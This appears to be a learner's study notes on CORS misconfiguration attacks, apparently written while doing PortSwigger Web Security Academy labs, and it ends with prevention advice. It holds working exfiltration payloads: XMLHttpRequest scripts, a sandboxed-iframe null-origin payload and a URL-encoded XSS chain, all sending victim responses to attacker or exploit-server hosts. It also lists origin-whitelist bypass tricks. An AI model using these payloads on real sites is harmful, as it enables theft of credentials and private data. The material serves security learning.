Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). 



Same-origin policy
=
The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.

CORS is a way the SOP is flexibily controlled as to get resources from other trusted domains


Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities. 


 One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
 <script>
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

It then responds with:
===
<script>
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
</script>
These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
<script>

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};


</script>

sometimes application compare oringin  urls to white listed once 



Errors parsing Origin headers - Continued
==
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:
normal-website.com

An attacker might be able to gain access by registering the domain:
hackersnormal-website.com

Alternatively, suppose an application grants access to all domains beginning with
normal-website.com

An attacker might be able to gain access using the domain:
normal-website.com.evil-user.net 




Whitelisted null origin value
==
The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

    Cross-origin redirects.
    Requests from serialized data.
    Request using the file: protocol.
    Sandboxed cross-origin requests.

note test origin with null:
first if it returns ->>
<script>
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 
</script>

use this pay load 

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 




Exploiting XSS via CORS trust relationships 
=

Given the following request:
<script>
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
</script>
If the server responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true


Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script> 



Cors with trusted insdecure protocols
==

note!!

always us the payload inside html body  and convert the javascript payload to url 


:> all payload converted to url for xss
<html>

  

<body>

  

<script>

document.location = "http://stock.0a7000ee0404267380e2171c0049004d.web-security-academy.net/?productId=%0a%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%20%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%37%30%30%30%65%65%30%34%30%34%32%36%37%33%38%30%65%32%31%37%31%63%30%30%34%39%30%30%34%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%20%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%20%20%20%20%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%39%39%30%30%61%37%30%34%63%64%32%36%33%38%38%30%39%65%31%36%32%61%30%31%65%65%30%30%35%63%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%6c%6f%67%3f%6b%65%79%3d%27%2b%72%65%71%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%20%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1"
</script>

</body>

</html>


  :> java script payload

<script>

var req = new XMLHttpRequest();

req.onload = reqListener;

req.open('get','https://0a7000ee0404267380e2171c0049004d.web-security-academy.net/accountDetails',true);

req.withCredentials = true;

req.send();

  

function reqListener() {

document.location='https://exploit-0a9900a704cd2638809e162a01ee005c.exploit-server.net/log?key='+req.responseText;

};

</script>

How to prevent CORS-based attacks
===

CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem. The following sections describe some effective defenses against CORS attacks. 


1.t may seem obvious but origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided. 

2. Avoid using the header Access-Control-Allow-Origin: null. Cross-origin resource calls from internal documents and sandboxed requests can specify the null origin. CORS headers should be properly defined in respect of trusted origins for private and public servers. 


3.Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains. 

4.CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS. 